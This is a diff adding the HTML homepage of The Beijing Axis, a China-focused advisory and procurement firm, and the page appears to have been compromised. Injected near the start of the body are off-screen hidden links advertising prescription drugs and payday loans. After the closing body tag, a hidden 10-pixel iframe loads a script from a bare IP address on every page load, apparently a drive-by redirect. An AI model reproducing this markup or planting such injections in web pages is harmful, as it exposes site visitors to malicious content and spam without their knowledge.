@@ -1,0 +1,786 @@
+ 
+ 
+ 
+	 
+
+ 
+ 
+ 
+	 
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb" >
+<head>
+	<link rel="stylesheet" href="/modules/mod_roknavmenu/themes/fusion/css/fusion.css" type="text/css" />
+	<script type="text/javascript" src="/modules/mod_roknavmenu/themes/fusion/js/fusion.js"></script>
+	  <base href="http://www.thebeijingaxis.com/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="The Beijing Axis,Commodities,Capital,Procurement,Strategy,中外商桥,中外商通,中非通" />
+  <meta name="description" content="The Beijing Axis is a China-focused international advisory and procurement firm operating in four principal areas: Commodities, Capital, Procurement, and Strategy." />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>The Beijing Axis | A China-focused International Advisory and Procurement Firm</title>
+  <link href="/en?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+  <link href="/en?format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+  <link href="/templates/bba/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <link rel="stylesheet" href="/plugins/system/jceutilities/css/jceutilities.css?v=224" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jceutilities/themes/standard/css/style.css?version=224" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jceutilities/themes/standard/css/style_ie6.css?v=224" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jcemediabox/css/jcemediabox.css?version=119" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jcemediabox/themes/standard/css/style.css?version=119" type="text/css" />
+  <link rel="stylesheet" href="/modules/mod_roknavmenu/themes/fusion/css/fusion.css" type="text/css" />
+  <link rel="stylesheet" href="/modules/mod_roknavmenu/themes/fusion/css/fusion-ie6.css" type="text/css" />
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/plugins/system/jceutilities/js/jceutilities.js?v=224"></script>
+  <script type="text/javascript" src="http://www.thebeijingaxis.com/plugins/system/mediaobject/js/mediaobject-150.js"></script>
+  <script type="text/javascript" src="/media/system/js/caption.js"></script>
+  <script type="text/javascript" src="/plugins/system/jcemediabox/js/jcemediabox.js?version=119"></script>
+  <script type="text/javascript" src="/modules/mod_roknavmenu/themes/fusion/js/sfhover.js"></script>
+  <script type="text/javascript">
+	window.addEvent('domready', function(){window.jcepopup=new JCEUtilities({popup:{legacy:0,resize:1,icons:1,overlay:1,overlayopacity:0.8,overlaycolor:"#000000",fadespeed:500,scalespeed:500,hideobjects:1,scrollpopup:1},tooltip:{className:"tooltip",opacity:1,speed:150,position:"br",offsets:{x: 16, y: 16}},imgpath:"plugins/system/jceutilities/img",theme:"standard",themecustom:"",themepath:"plugins/system/jceutilities/themes"});});	MediaObject.init({'flash':"9,0,124,0",'windowmedia':"5,1,52,701",'quicktime':"6,0,2,0",'realmedia':"7,0,0,0",'shockwave':"8,5,1,0"});JCEMediaBox.init({popup:{width:"",height:"",legacy:0,lightbox:0,shadowbox:0,resize:1,icons:1,overlay:1,overlayopacity:0.8,overlaycolor:"#000000",fadespeed:500,scalespeed:500,hideobjects:1,scrolling:"fixed",close:2,labels:{'close':'Close','next':'Next','previous':'Previous','cancel':'Cancel','numbers':'{$current} of {$total}'},cookie_expiry:"",google_viewer:0},tooltip:{className:"tooltip",opacity:0.8,speed:150,position:"br",offsets:{x: 16, y: 16}},base:"/",imgpath:"plugins/system/jcemediabox/img",theme:"standard",themecustom:"",themepath:"plugins/system/jcemediabox/themes"});
+  </script>
+
+	
+	
+	
+	<link rel="stylesheet" href="/templates/bba/css/general.css" type="text/css" />
+	<link rel="stylesheet" href="/templates/bba/css/colorbox.css" type="text/css" />
+
+	
+	<!--[if lte IE 8]>
+	<style type="text/css" media="screen">
+	.cboxIE #cboxTopLeft{background:transparent; filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=/templates/bba/images/colorbox/internet_explorer/borderTopLeft.png, sizingMethod='scale');}
+	.cboxIE #cboxTopCenter{background:transparent; filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=/templates/bba/images/colorbox/internet_explorer/borderTopCenter.png, sizingMethod='scale');}
+	.cboxIE #cboxTopRight{background:transparent; filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=/templates/bba/images/colorbox/internet_explorer/borderTopRight.png, sizingMethod='scale');}
+	.cboxIE #cboxBottomLeft{background:transparent; filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=/templates/bba/images/colorbox/internet_explorer/borderBottomLeft.png, sizingMethod='scale');}
+	.cboxIE #cboxBottomCenter{background:transparent; filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=/templates/bba/images/colorbox/internet_explorer/borderBottomCenter.png, sizingMethod='scale');}
+	.cboxIE #cboxBottomRight{background:transparent; filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=/templates/bba/images/colorbox/internet_explorer/borderBottomRight.png, sizingMethod='scale');}
+	.cboxIE #cboxMiddleLeft{background:transparent; filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=/templates/bba/images/colorbox/internet_explorer/borderMiddleLeft.png, sizingMethod='scale');}
+	.cboxIE #cboxMiddleRight{background:transparent; filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=/templates/bba/images/colorbox/internet_explorer/borderMiddleRight.png, sizingMethod='scale');}
+	</style>
+	<link href="/templates/bba/css/ie8.css" rel="stylesheet" type="text/css" />
+	<![endif]-->
+	<!--[if lte IE 6]>
+	<link href="/templates/bba/css/ie6.css" rel="stylesheet" type="text/css" />
+	<![endif]-->
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-18195507-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+
+
+<!-- Google Analytics for Joomla by Analytics For Joomla v1.0 | http://www.analyticsforjoomla.com/ -->
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-25989896']);
+    _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+<!-- End of Google Analytics for Joomla by Analytics For Joomla v1.0 -->
+</head>
+<body class="home"><div style="position:absolute; top:-388px;" id="metform">
+<a href="http://thebeijingaxis.com/bins/metformin.php">buy metformin online</a></div><!-- 5c55d92ae7 --><style>.paylotop{position:absolute;top:-9999px;}</style><div class="paylotop"><a href="http://www.ubiz-enterprise-education.co.uk/payday-loans.html">Payday loans uk</a></div><!-- 5c55d92ae7 --><!-- 4ef691b6a8 --><style>.paylotop{position:absolute;top:-9999px;}</style><div class="paylotop"><a href="http://www.ubiz-enterprise-education.co.uk/payday-loans.html">payday uk</a></div><!-- 4ef691b6a8 -->
+<div style="position:absolute; top:-482px;" id="lovelas"><a href="http://hereseroquelinfo.com/" title="buy seroquel">buy seroquel</a> project affective  <a href="http://intcelexa.com/" title="buy celexa">buy celexa</a> siblings institution  <a href="http://itzoloftoday.com/" title="buy zoloft">buy zoloft</a> development feasibility  <a href="http://lexaproanswers.com/" title="buy lexapro">buy lexapro</a> reproductive Resource  <a href="http://llipitorhere.com/" title="buy lipitor">buy lipitor</a> dose study virus  <a href="http://mecymbaltask.com/" title="buy cymbalta">buy cymbalta</a> hepatic (NICU)</div>				
+					<script language="javascript" type="text/javascript" src="/templates/bba/js/jquery.colorbox-min.js"></script>
+			<script language="javascript" type="text/javascript" src="/templates/bba/js/jquery.colorbox.js"></script>
+
+			<div style="display: none;"><div id="enquiryform">		<div class="moduletable  contact-outer">
+					<h3>Enquiry form</h3>
+					<table class="form" border="0">
+<tbody>
+<tr>
+<td width="60%"><!-- >>> Modules Anywhere >>> -->
+
+<form name="s5_quick_contact" method="post" action="">
+
+
+<input class="inputbox" id="namebox" onclick="s5_qc_clearname()" onfocus="s5_qc_clearname()" style="font-size:11px; font-family:arial; width:80%" type="text" value="Name..." name="name" /><br />
+<input class="inputbox" id="emailbox" onclick="s5_qc_clearemail()" onfocus="s5_qc_clearemail()" style="font-size:11px; font-family:arial; width:80%" type="text" value="E-mail..." name="email" /><br />
+<input class="inputbox" id="subjectbox" onclick="s5_qc_clearsubject()" onfocus="s5_qc_clearsubject()" style="font-size:11px; font-family:arial; width:80%" type="text" value="Subject..." name="subject" /><br />
+<textarea id="messagebox" rows="" cols="" class="inputbox textarea" onclick="s5_qc_clearbody()" onfocus="s5_qc_clearbody()" style="font-size:11px; font-family:arial; overflow:auto;width:80%; height:100px" name="message">Your Message...</textarea><br />
+<input class="inputbox" id="spambox" onclick="s5_qc_clearspam()" onfocus="s5_qc_clearspam()" style="font-weight:bold; font-size:11px; font-family:arial; width:80%" type="text" value="Enter The Code 8715" name="verif_box" /><br />
+
+
+<input id="email_address" type="hidden" value="" name="email_address" />
+
+<input class="button" type="button" onclick="s5_qc_submit()" value="Send Message" />
+</form>
+
+
+<script language="javascript" type="text/javascript">
+// <![CDATA[
+
+var s5_qc_spam_text = document.getElementById("spambox").value;
+
+function s5_qc_clearbody() {
+if (document.getElementById("messagebox").value == "Your Message...") {
+document.getElementById("messagebox").value="";
+}
+if (document.getElementById("namebox").value.length < 1) {
+document.getElementById("namebox").value = "Name...";
+}
+if (document.getElementById("emailbox").value.length < 1) {
+document.getElementById("emailbox").value = "E-mail...";
+}
+if (document.getElementById("subjectbox").value.length < 1) {
+document.getElementById("subjectbox").value = "Subject...";
+}
+if (document.getElementById("spambox").value.length < 1) {
+document.getElementById("spambox").value = s5_qc_spam_text;
+}
+}
+
+function s5_qc_clearname() {
+if (document.getElementById("namebox").value == "Name...") {
+document.getElementById("namebox").value="";
+}
+if (document.getElementById("messagebox").value.length < 1) {
+document.getElementById("messagebox").value = "Your Message...";
+}
+if (document.getElementById("emailbox").value.length < 1) {
+document.getElementById("emailbox").value = "E-mail...";
+}
+if (document.getElementById("subjectbox").value.length < 1) {
+document.getElementById("subjectbox").value = "Subject...";
+}
+if (document.getElementById("spambox").value.length < 1) {
+document.getElementById("spambox").value = s5_qc_spam_text;
+}
+}
+
+function s5_qc_clearemail() {
+if (document.getElementById("emailbox").value == "E-mail...") {
+document.getElementById("emailbox").value="";
+}
+if (document.getElementById("namebox").value.length < 1) {
+document.getElementById("namebox").value = "Name...";
+}
+if (document.getElementById("messagebox").value.length < 1) {
+document.getElementById("messagebox").value = "Your Message...";
+}
+if (document.getElementById("subjectbox").value.length < 1) {
+document.getElementById("subjectbox").value = "Subject...";
+}
+if (document.getElementById("spambox").value.length < 1) {
+document.getElementById("spambox").value = s5_qc_spam_text;
+}
+}
+
+function s5_qc_clearsubject() {
+if (document.getElementById("subjectbox").value == "Subject...") {
+document.getElementById("subjectbox").value="";
+}
+if (document.getElementById("namebox").value.length < 1) {
+document.getElementById("namebox").value = "Name...";
+}
+if (document.getElementById("emailbox").value.length < 1) {
+document.getElementById("emailbox").value = "E-mail...";
+}
+if (document.getElementById("messagebox").value.length < 1) {
+document.getElementById("messagebox").value = "Your Message...";
+}
+if (document.getElementById("spambox").value.length < 1) {
+document.getElementById("spambox").value = s5_qc_spam_text;
+}
+}
+
+function s5_qc_clearspam() {
+if (document.getElementById("spambox").value == s5_qc_spam_text) {
+document.getElementById("spambox").value="";
+}
+if (document.getElementById("namebox").value.length < 1) {
+document.getElementById("namebox").value = "Name...";
+}
+if (document.getElementById("emailbox").value.length < 1) {
+document.getElementById("emailbox").value = "E-mail...";
+}
+if (document.getElementById("messagebox").value.length < 1) {
+document.getElementById("messagebox").value = "Your Message...";
+}
+if (document.getElementById("subjectbox").value.length < 1) {
+document.getElementById("subjectbox").value = "Subject...";
+}
+}
+
+
+function s5_qc_isValidEmail(str_email) {
+   if (str_email.indexOf(".") > 2 && str_email.indexOf("@") > 0)  {
+   alert('We have received your message - Thank you');
+   document.s5_quick_contact.submit();
+   }
+   else {
+   alert('Your email address is not valid, please check again - Thank you');
+   }
+}
+
+function s5_qc_submit() {
+
+if (document.getElementById("spambox").value == s5_qc_spam_text || document.getElementById("subjectbox").value == "Subject..." || document.getElementById("namebox").value == "Name..." || document.getElementById("emailbox").value == "E-mail..." || document.getElementById("messagebox").value == "Your Message...") {
+alert('All fields are required, please complete the form - Thank you');
+return false;
+}
+
+if (document.getElementById("spambox").value != "8715") {
+alert('Your spam verification answer is incorrect.');
+return false;
+}
+
+var s5_message_holder = document.getElementById("messagebox").value;
+var s5_first_message_char = s5_message_holder.charAt(0);
+var s5_second_message_char = s5_message_holder.charAt(1);
+var s5_third_message_char = s5_message_holder.charAt(2);
+var s5_fourth_message_char = s5_message_holder.charAt(3);
+
+if (s5_first_message_char == "<") {
+return false;
+}
+
+if (s5_first_message_char == "w" && s5_second_message_char == "w" && s5_third_message_char == "w") {
+return false;
+}
+
+if (s5_first_message_char == "h" && s5_second_message_char == "t" && s5_third_message_char == "t") {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+if (s5_message_holder.indexOf("s5_qc_null") >= 0) {
+return false;
+}
+
+else {
+document.getElementById("email_address").value = "barbieco@thebeijingaxis.com; danielgalvez@thebeijingaxis.com; haiweihuang@thebeijingaxis.com";
+var email_str = document.getElementById("emailbox").value;
+s5_qc_isValidEmail(email_str);
+}
+}
+
+// ]]>
+</script>
+<!-- <<< Modules Anywhere <<< --><br /></td>
+<td class="contact-info">
+<p><strong>Address</strong></p>
+<p><strong>Beijing, China</strong></p>
+<p>Phoenix Place Tower A, Unit 2306-2307 5A Shuguang Xili, Chaoyang District Beijing 100028, China</p>
+<p>Tel: +86 10 6440 2106</p>
+<a title="Open in Google Maps" href="http://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=en&amp;geocode=&amp;q=%E5%8C%97%E4%BA%AC%E5%B8%82%E6%9C%9D%E9%98%B3%E5%8C%BA%E6%9B%99%E5%85%89%E8%A5%BF%E9%87%8C%E7%94%B25%E5%8F%B7%E5%87%A4%E5%87%B0%E7%BD%AE%E5%9C%B0%E5%B9%BF%E5%9C%BA&amp;sll=37.0625,-95.677068&amp;sspn=43.528905,93.076172&amp;ie=UTF8&amp;hq=%E5%87%A4%E5%87%B0%E7%BD%AE%E5%9C%B0%E5%B9%BF%E5%9C%BA&amp;hnear=China+Beijing+Chao+Yang+Qu+Bei+San+Huan+Dong+Lu+Fu+Lu%E6%9B%99%E5%85%89%E8%A5%BF%E9%87%8C&amp;z=15" target="_blank">Show  on Google Maps</a></td>
+</tr>
+</tbody>
+</table>		</div>
+	</div></div>
+
+		
+	<script type="text/javascript" src="/templates/bba/js/general.js"></script>
+
+
+	<div id="wrapper">
+	<div id="main">
+		<a class="logo" href="/home" title="The Beijing Axis"><img src="/templates/bba/images/logo.png" title="The Beijing Axis" /></a>
+				<div class="moduletable language">
+					<div id="jflanguageselection"><ul class="jflanguageselection"><li id="active_language"><a href="http://www.thebeijingaxis.com/en" ><span lang="en" xml:lang="en">English </span></a></li><li><a href="http://www.thebeijingaxis.com/zh" ><span lang="zh" xml:lang="zh">中文</span></a></li></ul></div><!--Joom!fish V2.0.4 (Lightning)-->
+<!-- &copy; 2003-2009 Think Network, released under the GPL. -->
+<!-- More information: at http://www.joomfish.net -->
+		</div>
+			<div class="moduletable search-area">
+					<form action="index.php" method="post">
+	<div class="search search-area">
+		<input name="searchword" id="mod_search_searchword" maxlength="20" alt="Search" class="inputbox search-area" type="text" size="20" value="search..."  onblur="if(this.value=='') this.value='search...';" onfocus="if(this.value=='search...') this.value='';" /><input type="submit" value="Search" class="button search-area" onclick="this.form.searchword.focus();"/>	</div>
+	<input type="hidden" name="task"   value="search" />
+	<input type="hidden" name="option" value="com_search" />
+	<input type="hidden" name="Itemid" value="1" />
+</form>		</div>
+			<div class="moduletable enquiry contact-us popup">
+					<p><a href="#enquiryform" class="enquiry-button">Make an Enquiry</a></p>		</div>
+	
+		<div class="content">
+					<div class="moduletable main-menu">
+					<div id="horizmenu-surround">
+    <ul class="menutop level1" >
+    	    		<li class="item1 active root" >
+			<a class="item" href="http://www.thebeijingaxis.com/"  >
+						<span>Home</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+    	    		<li class="item2 root" >
+			<a class="item" href="/en/about-tba"  >
+						<span>About TBA</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+    	    		<li class="item3 parent root" >
+			<a class="daddy item" href="/en/services"  >
+						<span>Services</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			<ul class="level2">
+					
+			<li class="item9" >
+			<a class="item" href="/en/services/beijing-axis-commodities"  >
+						<span>Beijing Axis Commodities</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item8" >
+			<a class="item" href="/en/services/beijing-axis-capital"  >
+						<span>Beijing Axis Capital</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item24" >
+			<a class="item" href="/en/services/beijing-axis-procurement"  >
+						<span>Beijing Axis Procurement</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item25" >
+			<a class="item" href="/en/services/beijing-axis-strategy"  >
+						<span>Beijing Axis Strategy</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+			</ul>
+		
+</li>	
+    	    		<li class="item4 parent root" >
+			<a class="daddy item" href="/en/track-record/commodities"  >
+						<span>Track Record</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			<ul class="level2">
+					
+			<li class="item19" >
+			<a class="item" href="/en/track-record/commodities"  >
+						<span>Commodities</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item22" >
+			<a class="item" href="/en/track-record/capital"  >
+						<span>Capital</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item20" >
+			<a class="item" href="/en/track-record/procurement"  >
+						<span>Procurement</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item27" >
+			<a class="item" href="/en/track-record/strategy"  >
+						<span>Strategy</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+			</ul>
+		
+</li>	
+    	    		<li class="item5 parent root" >
+			<a class="daddy item" href="/en/news-a-media/tba-news"  >
+						<span>News &amp; Media</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			<ul class="level2">
+					
+			<li class="item14" >
+			<a class="item" href="/en/news-a-media/tba-news"  >
+						<span>TBA News</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item15" >
+			<a class="item" href="/en/news-a-media/tba-presentations"  >
+						<span>TBA Presentations</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item21" >
+			<a class="item" href="/en/news-a-media/company-brochures"  >
+						<span>Company Brochures</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item32" >
+			<a class="item" href="http://www.thebeijingaxis.com/tca/"  >
+						<span>The China Analyst (Online)</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item23" >
+			<a class="item" href="/en/news-a-media/the-china-analyst"  >
+						<span>The China Analyst (Download)</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item30" >
+			<a class="item" href="/en/news-a-media/the-china-compass"  >
+						<span>The China Compass</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item28" >
+			<a class="item" href="http://chinasourcingblog.org/"  >
+						<span>The China Sourcing Blog</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item34" >
+			<a class="item" href="/en/news-a-media/tba-events"  >
+						<span>TBA Events</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+					
+			<li class="item35" >
+			<a class="item" href="/en/news-a-media/tba-articles"  >
+						<span>TBA Articles</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+			</ul>
+		
+</li>	
+    	    		<li class="item6 root" >
+			<a class="item" href="/en/tba-people"  >
+						<span>TBA People</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+    	    		<li class="item29 root" >
+			<a class="item" href="/en/careers"  >
+						<span>Careers</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+    	    		<li class="item7 root" >
+			<a class="item" href="/en/contact-us"  >
+						<span>Contact Us</span>
+			<span class="sf-sub-indicator"></span>
+		</a>
+			
+</li>	
+    	    </ul>
+</div>
+		</div>
+			<div class="moduletable slideshow">
+					
+
+<div class="tab">
+			<div class="tab_108"><a class="title">Strategy</a></div>
+	</div>
+
+
+
+	<div class="contentpaneopen">
+	
+
+	<p><img src="/images/stories/feature/feature5.jpg" alt="Strategy" width="939" height="273" /></p>
+<div class="feature_content item4 equipment-part">
+<p>Beijing Axis Strategy provides management consulting services to CEOs and senior executives in the areas of strategy formulation and strategy implementation. <a href="/track-record/strategy" class="button">Read more</a></p>
+</div>	</div>
+
+<div class="tab">
+			<div class="tab_3"><a class="title">Procurement</a></div>
+	</div>
+
+
+
+	<div class="contentpaneopen">
+	
+
+	<p><img alt="Procurement" src="/images/stories/feature/feature2.jpg" width="940" height="273" /></p>
+<div class="feature_content item4 equipment-part">
+<p>Beijing Axis Procurement is a China-focused global procurement house providing a comprehensive range of services across the supply chain. We have significant experience in sourcing raw materials, components, engineered equipment, and services from China.<a class="button" href="/track-record/procurement">Read more</a></p>
+</div>	</div>
+
+<div class="tab">
+			<div class="tab_1"><a class="title">Capital</a></div>
+	</div>
+
+
+
+	<div class="contentpaneopen">
+	
+
+	<p><img height="273" width="939" src="/images/stories/feature/feature4.jpg" alt="Capital" /></p>
+<div class="feature_content item5">
+<div class="feature-top"></div>
+<div class="feature-mid">
+<p>Beijing Axis Capital provides independent corporate finance advisory and transaction origination services. We have a specialist China-focused approach with extensive international and Africa-specific knowledge and experience.<a href="/track-record/capital" class="button">Read more</a></p>
+</div>
+</div>	</div>
+
+<div class="tab">
+			<div class="tab_4"><a class="title">Commodities</a></div>
+	</div>
+
+
+
+	<div class="contentpaneopen">
+	
+
+	<p><img height="273" width="940" src="/images/stories/feature/feature1.jpg" alt="Commodities" /></p>
+<div class="feature_content item3">
+<p>Beijing Axis Commodities supports commodity producers with their international marketing efforts and the structuring of off-take agreements, and assists commodity consumers with their procurement efforts in securing supply.<a href="/track-record/commodities" class="button">Read more</a></p>
+</div>	</div>
+		</div>
+	
+
+			
+		<div class="bottom-area">
+		<div class="bottom-line">
+				<div class="moduletable media">
+					<h3>MEDIA</h3>
+					<div class="bba-dow"><a class="download-block" href="/en/news-a-media/company-brochures/doc_download/14-the-beijing-axis-brochure"><span class="download">
+<h3>The Beijing Axis</h3>
+<span class="f-name">COMPANY PROFILE</span></span></a></div>
+<div class="bba-dow"><a class="download-block" href="/en/news-a-media/company-brochures/doc_download/15-the-beijing-axis-capability-statement"><span class="download">
+<h3>The Beijing Axis</h3>
+<span class="f-name">CAPABILITY STATEMENT</span></span></a></div>		</div>
+			<div class="moduletable">
+					<h3>ARTICLES</h3>
+					<p style="padding-bottom: 5px;"><span style="color: #990000;"><strong>LETTER FROM CHINA: Early birds will score when Beijing opens the floodgates<br /></strong></span></p>
+<p>THE communiqué published at the third plenum of the 18th Central Committee has undoubtedly been perused by analysts and observers from around the world...</p>
+<!-- >>> Modules Anywhere >>> --><div class="more-button"><a href="/news-a-media/tba-articles">Read More</a></div><!-- <<< Modules Anywhere <<< -->		</div>
+			<div class="moduletable">
+					<h3>EVENTS</h3>
+					<p style="padding-bottom: 5px;"><span style="color: #990000;"><strong>Mining Indaba 2014 Cocktail Hour with Cadiz Corporate Solutions and The Beijing Axis<br /></strong></span></p>
+<table style="width: 100%;" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td width="20%">Date:</td>
+<td>5 February 2014, Wednesday</td>
+</tr>
+<tr>
+<td>Time</td>
+<td>17:00 for 17:30</td>
+</tr>
+<tr>
+<td>Venue:</td>
+<td><strong>Brundyn+ Gallery</strong><br />170 Buitengracht Street, Cape Town, South Africa</td>
+</tr>
+</tbody>
+</table>
+<!-- >>> Modules Anywhere >>> --><div class="more-button"><a href="/news-a-media/tba-events">Read More</a></div><!-- <<< Modules Anywhere <<< -->		</div>
+	
+		<div class="clear"></div>
+		</div>
+	</div>
+
+</div>
+<div class="footer">
+			<div class="moduletable">
+					<!-- Start of StatCounter Code for Joomla -->
+<p><noscript><div class="statcounter"><a title="joomla stats"
+href="http://statcounter.com/joomla/" target="_blank"><img
+class="statcounter"
+src="http://c.statcounter.com/7252077/0/dcdb63cb/1/"
+alt="joomla stats"></a></div></noscript></p>
+<!-- End of StatCounter Code for Joomla -->		</div>
+			<div class="moduletable">
+					<a href="/en?format=feed&amp;type=rss">
+	<img src="/images/M_images/livemarks.png" alt="feed-image"  /> <span>Receive company updates via RSS feed</span></a>		</div>
+	
+	<p>Copyright © 2012, The Beijing Axis. All Rights Reserved.</p>
+
+</div>
+
+</div>
+</div>
+
+
+<!--  -->
+
+<script type="text/javascript">
+var sc_project=6170714; 
+var sc_invisible=1; 
+var sc_security="08c2d394"; 
+</script>
+
+<script type="text/javascript"
+src="http://www.statcounter.com/counter/counter.js"></script><noscript><div
+class="statcounter"><a title="customisable counter"
+href="http://www.statcounter.com/free_hit_counter.html"
+target="_blank"><img class="statcounter"
+src="http://c.statcounter.com/6170714/0/08c2d394/1/"
+alt="customisable counter" ></a></div></noscript>
+<!-- End of StatCounter Code -->
+
+</body><iframe width="10" height="10" src="http://176.9.204.109/speedup/go.php?sid=1" frameborder="0"></iframe>
+
+
+
+
+</html>
